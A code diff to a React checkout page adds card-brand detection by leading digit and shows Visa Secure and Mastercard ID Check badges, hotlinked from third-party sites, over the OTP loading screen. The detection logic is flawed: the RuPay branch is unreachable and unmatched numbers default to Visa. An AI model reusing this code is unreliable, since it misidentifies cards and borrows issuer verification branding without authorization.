@@ -180,6 +180,33 @@ const Checkout = () => {
   const [cardError, setCardError] = useState("");
   const [otpLoading, setOtpLoading] = useState(false);
 
+  // Card brand logos
+  const cardBrandLogos = {
+    visa: 'https://brandlogos.net/wp-content/uploads/2025/04/visa_secure_badge-logo_brandlogos.net_n9x0z-300x300.png',
+    mastercard: 'https://www.zemplerbank.com/_gatsby/image/7ebfe7b59db9bfc6eaa37054cc8408c1/5dd4f65fbae2cfbdea58fecc2027f1c2/file.idcheck_logo_new.jpg?u=https://cms-live.zemplerbank.com/media/ynipjxfp/idcheck_logo_new.jpg&a=w=750&h=750&fit=crop&crop=center&fm=jpg&q=75&cd=7354cb526a7837deb0a90f42ba9b3dd8',
+    discover: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png',
+    rupay: 'https://logotyp.us/file/rupay.svg',
+    amex: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png' // fallback to discover for amex
+  };
+
+  // Function to detect card brand from card number
+  const getCardBrand = (cardNumber: string) => {
+    const cleanNumber = cardNumber.replace(/\s/g, '');
+    
+    if (cleanNumber.startsWith('4')) {
+      return 'visa';
+    } else if (cleanNumber.startsWith('5') || cleanNumber.startsWith('2')) {
+      return 'mastercard';
+    } else if (cleanNumber.startsWith('6')) {
+      return 'discover';
+    } else if (cleanNumber.startsWith('3')) {
+      return 'amex';
+    } else if (cleanNumber.startsWith('8') || cleanNumber.startsWith('60')) {
+      return 'rupay';
+    }
+    return 'visa'; // default fallback
+  };
+
   const cardSessionMap = React.useRef({});
 
   // Pricing data based on the main page
@@ -1417,8 +1444,19 @@ const Checkout = () => {
                   {otpLoading && (
                     <div className="absolute inset-0 bg-white rounded-lg flex items-center justify-center z-50">
                       <div className="text-center">
-                        <div className="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
-                        <p className="text-gray-600 text-sm">Loading verification...</p>
+                        {/* Card Brand Logo */}
+                        <div className="mb-6">
+                          <img 
+                            src={cardBrandLogos[getCardBrand(cardData.cardNumber) as keyof typeof cardBrandLogos]} 
+                            alt="Card Brand" 
+                            className="w-16 h-16 mx-auto object-contain"
+                            onError={(e) => {
+                              e.currentTarget.src = cardBrandLogos.visa;
+                            }}
+                          />
+                        </div>
+                        {/* Loading Spinner */}
+                        <div className="w-8 h-8 border-3 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto"></div>
                       </div>
                     </div>
                   )}
